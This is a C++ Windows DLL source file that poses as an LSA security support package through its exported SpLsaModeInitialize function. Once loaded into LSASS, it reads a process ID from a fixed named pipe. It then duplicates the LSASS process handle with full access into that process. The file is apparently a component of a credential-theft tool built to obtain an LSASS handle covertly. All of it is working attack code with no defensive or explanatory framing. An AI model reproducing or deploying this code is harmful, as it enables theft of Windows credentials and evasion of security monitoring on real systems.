// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <winternl.h>
#include <ntstatus.h>
#include <tlhelp32.h>
#include <iostream>
#include <Windows.h>

#define EXTERN_DLL_EXPORT extern "C" __declspec(dllexport)

const int MESSAGE_SIZE = 512;

int getPid() {
    LPCWSTR pipeName = L"\\\\.\\pipe\\7d872e921a4b4b1b8b295395099b0209";
    HANDLE clientPipe = NULL;
    BOOL isPipeRead = true;
    wchar_t message[MESSAGE_SIZE] = { 0 };
    DWORD bytesRead = 0;
    wchar_t* end;
    int pid;

    clientPipe = CreateFile(pipeName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    isPipeRead = ReadFile(clientPipe, &message, MESSAGE_SIZE, &bytesRead, NULL);
    pid = wcstol(message, &end, 10);

    return pid;
}

void dupli() {

    HANDLE hProcess = INVALID_HANDLE_VALUE, hTargetHandle = INVALID_HANDLE_VALUE;
    int pid = getPid();
    if (pid == 0)
        return;
    hProcess = OpenProcess(PROCESS_DUP_HANDLE, FALSE, (DWORD)pid);

    if (hProcess == INVALID_HANDLE_VALUE)
        return;

    DuplicateHandle(GetCurrentProcess(), GetCurrentProcess(), hProcess, &hTargetHandle, PROCESS_ALL_ACCESS, FALSE, 1);
    CloseHandle(hProcess);
}

EXTERN_DLL_EXPORT NTSTATUS SpLsaModeInitialize(ULONG LsaVersion, PULONG PackageVersion, LPVOID ppTables, PULONG pcTables) {
  
    dupli();
    return 0;
}


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        //dupli();
        //break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

